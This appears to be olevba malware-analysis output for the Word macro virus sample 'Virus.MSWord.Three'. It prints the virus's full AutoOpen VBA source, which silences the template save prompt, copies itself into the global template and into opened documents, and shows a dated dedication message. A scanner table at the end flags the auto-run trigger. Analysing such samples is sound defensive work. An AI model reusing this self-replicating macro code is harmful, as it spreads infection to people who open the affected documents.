olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Three
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Three - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Three - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim total
Dim present
Dim cycle
Dim a$

WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
total = WordBasic.CountMacros(0)
present = 0

If total > 0 Then
For cycle = 1 To total
If WordBasic.[MacroName$](cycle, 0) = "AutoOpen" Then
present = 1
End If
'End If
a$ = WordBasic.[WindowName$]() + ":AutoOpen"

If present <> 1 Then
WordBasic.MacroCopy a$, "Global:AutoOpen", 1

Else
present = 0

If WordBasic.CountMacros(1) <> 0 Then
present = 1
End If

If present = 0 Then
WordBasic.FileSaveAs Format:=1

WordBasic.MacroCopy "Global:AutoOpen", a$
End If
End If

If WordBasic.Day(WordBasic.Now()) = 2 And WordBasic.Month(WordBasic.Now() = 11) Then
    WordBasic.MsgBox "Dedicated to 3 Crowns '98"
End If

Rem First Macro Vir from DarkDeath

WordBasic.FileSave
Next
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

